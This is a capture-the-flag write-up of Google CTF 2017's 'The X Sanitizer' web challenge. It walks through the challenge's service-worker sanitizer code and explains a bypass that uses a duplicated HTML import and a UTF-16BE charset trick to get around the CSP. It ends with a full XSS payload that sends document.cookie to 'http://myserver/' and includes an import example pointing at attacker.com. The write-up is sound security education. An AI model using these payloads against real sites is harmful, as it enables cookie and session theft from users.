---
layout: post
title: "Google CTF Quals 2017 - The X Sanitizer"
categories: writeups googlectf
tags: web
author: eboda
---

We participated as Eat Sleep Pwn Repeat in the qualifications for Google CTF last weekend.  As expected, the CTF contained some great challenges, one of them being **The X Sanitizer**, a medium web challenge.

Let's get started with an overview of the web app, if you are already familiar with it, you can directly skip to the [Exploitation](#exploitation) section or look at the [final payload](#final-payload).

## Overview & Functionality
The web app served as a HTML sanitizer, with which *harmful scripts remove themselves* according to the authors. The `index.html` simply had a text box to input a payload:

{% highlight html %}
<!DOCTYPE html>
<html>
  <head>
    <title>The X Sanitizer</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
    <link rel="stylesheet" type="text/css" href="style.css"></link>
    <script src="main.js"></script>
    <script src="sanitizer.js"></script>
  </head>
  <body>

    [ ... ]

    <h2>Input HTML code</h2>
    <div id="input_form">
    <textarea id="input"></textarea>
    <button id="render">Sanitize and render</button>
    <button id="submit">Submit solution</button>
    </div>
    <h2>Sanitized HTML</h2>
    <xmp id="output_text"></xmp>
    <h2>Rendered sanitized HTML</h2>
    <div id="output_render"></div>
  </body>
</html>
{% endhighlight %}

Notice that a Content Security Policy header is set to only allow same-origin scripts, objects, etc.

The `main.js` simply adds listeners to the buttons and makes an initial call to `render()`:

{% highlight js %}

if (document.cookie.indexOf('flag=') === -1) document.cookie = 'flag=test_fl46'; // For testing
window.addEventListener("load", function() {
  // Main program logic
  var input = document.getElementById('input');
  var output_text = document.getElementById('output_text');
  var output_render = document.getElementById('output_render');
  var hash = location.hash.slice(1) || 'This is the <s>perfect</s><b>best</b>\n' +
      '<script>alert(document.domain);</script>\n' +
      '<i>HTML sanitizer</i>.\n' +
      '<script src="https://example.com"></script>';
  input.value = decodeURIComponent(hash);
  function render() {
    var html = input.value;
    location.hash = encodeURIComponent(html);
    sanitize(html, function (html){
      output_render.innerHTML = html;
      output_text.textContent = html;
    });
  }
  document.getElementById('render').addEventListener("click", render);
  render();

  document.getElementById('submit').addEventListener("click", function() {
    location = '/submit.html?html=' + encodeURIComponent(input.value)
  });
});

{% endhighlight %}

The `render()` function then calls `sanitize()` with the content of the text box as parameter and adds the sanitized HTML to a `div` via the `innerHTML` property. The actual interesting bits of the website lie in the `sanitizer.js`. It contains two parts, one is the `sanitize()` function and the other is logic to intercept fetch requests. 

{% highlight js %}

// [[[ 1 ]]]
function sanitize(html, callback) {
  if (!window.serviceWorkerReady) serviceWorkerReady = new Promise(function(resolve, reject) {
    if (navigator.serviceWorker.controller) return resolve();
    navigator.serviceWorker.register('sanitizer.js')
        .then(reg => reg.installing.onstatechange = e => (e.target.state == 'activated') ? resolve() : 0);
  });
  while (html.match(/meta|srcdoc|utf-16be/i)) html = html.replace(/meta|srcdoc|utf-16be/i, ''); // weird stuff...
  serviceWorkerReady.then(function() {
    var frame = document.createElement('iframe');
    frame.style.display = 'none';
    frame.src = '/sandbox?html=' + encodeURIComponent(html);
    document.body.appendChild(frame);
    addEventListener('message', function listener(msg) {
      if (msg.source != frame.contentWindow || msg.origin != location.origin) return;
      document.body.removeChild(frame);
      removeEventListener('message', listener);
      callback(msg.data);
    });
  });
}


// [[[ 2 ]]]
addEventListener('install', e => e.waitUntil(skipWaiting()));
addEventListener('activate', e => e.waitUntil(clients.claim()));
addEventListener('fetch', e => e.respondWith(clients.get(e.clientId).then(function(client) {
  var isSandbox = url => (new URL(url)).pathname === '/sandbox';
 
  if (client && isSandbox(client.url)) {
    if (e.request.url === location.origin + '/sanitize') {
    // [[[ 2 a ]]]
      return new Response(`
        onload = _=> setTimeout(_=> parent.postMessage(document.body.innerHTML, location.origin), 1000);
        remove = node => (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
        document.addEventListener("securitypolicyviolation", e => remove(e.target));
        document.write('<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src *"><body>');
      `);
    } else {
        // [[[ 2 b ]]]
      // Violation events often don't point to the violating element, so we need this additional logic to track them down.
      // This is also important from marketing perspective. Do not remove or simplify this logic.
      return new Response(`
        with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel="import"]'));
        // <script src=x></script>
      `);
    }
  } else if (isSandbox(e.request.url)) {
    // [[[ 2 c ]]]
    return new Response(
      '<!doctype HTML>\n<script src=sanitize>\n</script>\n<body>' + decodeURIComponent(e.request.url.split('?html=')[1]),
      {headers: new Headers({'X-XSS-Protection': '0', 'Content-Type': 'text/html'})}
    );
  } else {
    // [[[ 2 d ]]]
    return fetch(e.request);
  }
})));
{% endhighlight %}

As you can see at *[[[ 1 ]]]* the `sanitize()` function registers the script as a service worker. Then it replaces some unwanted keywords in the HTML and creates an iframe in which it loads the `/sandbox?html=XXX` URL, where `XXX` is the HTML passed into the sanitize function as parameter. When it receives a message from the iframe it removes the iframe and forwards the message to the callback, i.e. it returns the sanitized HTML.

In *[[[ 2 ]]]* a `fetch()` listener is added to intercept requests and to respond, based on the context. If the requested URL is the sandbox URL, it will return the response at *[[[ 2 c ]]]*, which is the implementation of the sandbox, a simple HTML page: 

{% highlight html %}<script src=sanitize></script><body>INPUT_HTML{% endhighlight %}

Here *INPUT_HTML* is the parameter passed to the sandbox URL, i.e. the HTML passed to `sanitize()`. Finally, the `X-XSS-Protection` header is set to 0, so that you can't use Chrome's XSS auditor to block execution of `<script src=sanitize></script>`. 

That *sanitize* script is loaded from `/sanitize`, which is served at *[[[ 2 a ]]]*, but only if requested from inside the sandbox. After one second it will post the `document.body.innerHTML` of the sandbox to its parent, which in turn will forward it to the `main.js` script from the beginning. Furthermore it defines a function `remove()` (which simply removes a DOM element from the DOM) and uses this function as a handler for Content Securit Policy violations. Finally, a new CSP header is set, this one will allow scripts from any domain, but nothing else. For example if there is a HTML tag with some inline script, it would violate the CSP and get removed from the DOM.

As we have seen, when in the sandbox, the CSP allows scripts from any origin. However, it will intercept those requests and respond with the script at *[[[ 2 b ]]]* instead of fetching the real requested script. This replacement script removes the `<script>` tag that initiated the request, or if the request did not originate from a script tag, it will remove a `<link rel="import">` tag instead.

And finally, if we are not in the sandbox and are not requesting the sandbox, requests are simply passed through at *[[[ 2 d ]]]*.


Now that the functionality is out of the way, we can get to the fun part!

## Exploitation
There is two problems we need to solve:
1. Get some javascript payload through the sanitizer. 
2. Bypass the CSP of the main website, as it only allows same-origin scripts. 


### Sanitizer bypass
If we trigger a CSP violation inside the sandbox, the responsible DOM element will definitely get removed by this line:

{% highlight js %}
remove = node => (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
document.addEventListener("securitypolicyviolation", e => remove(e.target));
{% endhighlight %}

There is two ways to not trigger the CSP inside the sandbox when including javascript:

1. via external scripts like `<script src=//example.com></script>`. (Remember CSP allows scripts from any origin)
2. via [HTML imports](https://developer.mozilla.org/en-US/docs/Web/Web_Components/HTML_Imports) using the `<link rel="import">` tag. 

<sup>**Note**: since the sanitized HTML will eventually be added to the DOM via `.innerHTML`, script tags would not get executed anyway and be useless to us.</sup>

HTML imports are luckily governed by the `script-src` CSP directive as well, so doing something like `<link rel="import" href="http://example.com/">` will not violate the sandbox CSP. But the `<link rel="import">` tags get removed here:

{% highlight js %}
with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel="import"]'));
{% endhighlight %}
Right? Well not really, `querySelector()` matches only one element. By adding an additional `<link rel="import">`, we can make sure that the correct one will not get removed: 

{% highlight html %}
<link rel="import"><link rel="import" href="http://attacker.com/pwn.html">
{% endhighlight %}

Using this payload, the sanitized HTML added to the DOM looks like this: 

{% highlight html %}
<link rel="import" href="http://attacker.com/pwn.html">
{% endhighlight %}

We can therefore include a HTML page, effectively bypassing the sanitizer.


### CSP bypass
Outside of the sandbox that won't work though, since the CSP only allows same-origin scripts. And here I got stuck for a while. I tried to import the `/sandbox?html=` page, which changes the CSP to allow cross-domain scripts via the `/sanitize` script, but `/sanitize` is only served if requested from inside the sandbox, so that didn't work. 

I thought that there must be a way to include a useful script from the same origin. The only point where we control some output is the `/sandbox?html=` endpoint. However, it prepends our output with some HTML, so it is not valid javascript. But `<script>` tags also take a [charset argument](https://www.w3schools.com/tags/att_script_charset.asp), which can force the charset of the script. It turns out, if we parse `/sandbox?html=` output as UTF-16BE, the output is a valid (but undefined) javascript identifier. We can therefore simply add a payload like `=0;alert(1)` (UTF-16BE encoded) and if we include it, we will see the alert popup!

Unfortunately `utf-16be` is one of the filtered keywords:
{% highlight js %}
while (html.match(/meta|srcdoc|utf-16be/i)) html = html.replace(/meta|srcdoc|utf-16be/i, ''); 
{% endhighlight %}

However, there is a way to bypass it. Using the `/sandbox?html=` endpoint once again, we can basically request a page from the same-origin with any HTML we desire. The parameter can be URL encoded, which therefore can be used to bypass the keyword filter. For example, the following payload will import an HTML page containing a custom `<meta>` tag: 
{% highlight js %}
<link rel="import"><link rel="import" href="/sandbox?html=<met%61%20foobar>">
{% endhighlight %}
If you check in Chrome, you can see the imported HTML and the meta tag: 

![meta]({{ site.url }}/imgs/gctf_xsanitizer_1.png).

### Final payload
Replacing the meta tag with something more useful like a `<script>` with custom charset results in the following payload: 

{% highlight html %}
<link rel=import><link rel=import href="https://sanitizer.web.ctfcompetition.com/sandbox?html=<script charset=%22utf-16b%65%22%20src=/sandbox%3fhtml=PAYLOAD></script>">
{% endhighlight %}

We have url-encoded one character of `utf-16be` to bypass the keyword filter. All that remains now is to replace `PAYLOAD` with the UTF-16BE payload. Encoding ASCII strings to UTF-16BE is simple: prepend each character with a null byte. I have used the following payload:

{% highlight js %}
=0;location.href='http://myserver/'+document.cookie;
{% endhighlight %}

In UTF-16BE it looked like this:
{% highlight js %}
%00=%000%00;%00l%00o%00c%00a%00t%00i%00o%00n%00.%00h%00r%00e%00f%00=%00'%00h%00t%00t%00p%00:%00/%00/%00m%00y%00s%00e%00r%00v%00e%00r%00/%00'%00+%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00;
{% endhighlight %}

Putting it all together results in the final payload:
{% highlight html %}
<link rel=import><link rel=import href="https://sanitizer.web.ctfcompetition.com/sandbox?html=<script charset=%22utf-16b%65%22%20src=/sandbox%3fhtml=%2500=%25000%2500;%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500.%2500h%2500r%2500e%2500f%2500=%2500'%2500h%2500t%2500t%2500p%2500:%2500/%2500/%2500m%2500y%2500s%2500e%2500r%2500v%2500e%2500r%2500/%2500'%2500+%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500;></script>">
{% endhighlight %}

Note the double url-encoding. It is necessary since that parameter is in an URL which in turn is a parameter of another URL.

The HTML generated by this payload inside Chrome:

![pwnie]({{ site.url }}/imgs/gctf_xsanitizer_2.png).


My server then received the flag: **CTF{no-problem-this-can-be-fixed-by-adding-a-single-if}**

I don't quite understand its meaning, so I'm not sure this was the intended solution :)


